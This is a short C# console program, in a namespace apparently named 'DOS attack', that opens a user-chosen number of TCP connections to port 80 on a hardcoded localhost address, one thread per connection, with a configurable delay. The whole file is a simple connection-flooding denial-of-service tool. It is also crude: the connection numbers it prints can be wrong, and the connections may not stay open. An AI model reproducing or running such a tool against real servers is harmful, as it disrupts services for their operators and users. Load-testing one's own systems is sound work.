using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DOS_utok
{
    class Program
    {
        static void CreateConnection(int i)
        {
            try
            {
                TcpClient tcpClient = new TcpClient();
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);
                tcpClient.Connect(endPoint);
                Console.WriteLine(tcpClient.Connected ? "(#" + i + " Connected!)" : "(#" + i + " Not connected!)");
            }
            catch (Exception){}
        }

        static void Main(string[] args)
        {
            int connections;
            int delay;
            Console.Write("Enter number of connections: ");
            connections = Convert.ToInt32(Console.ReadLine()); 
            Console.Write("Enter delay (ms): ");
            delay = Convert.ToInt32(Console.ReadLine());

            List<Thread> list = new List<Thread>();

            for (int i = 0; i < connections; i++)
            {
                var t = new Thread(() => CreateConnection(i));
                list.Add(t);
                t.Start();
                Thread.Sleep(delay);
            }

            Console.WriteLine("Press enter to disconnect all connections.");
            Console.ReadLine();

            int connCount = list.Count;
            for (int i = 0; i < list.Count; i++)
            {
                list[i].Abort();
            }
            Console.WriteLine("All connections (" + connCount + ") closed.");
        }
    }
}
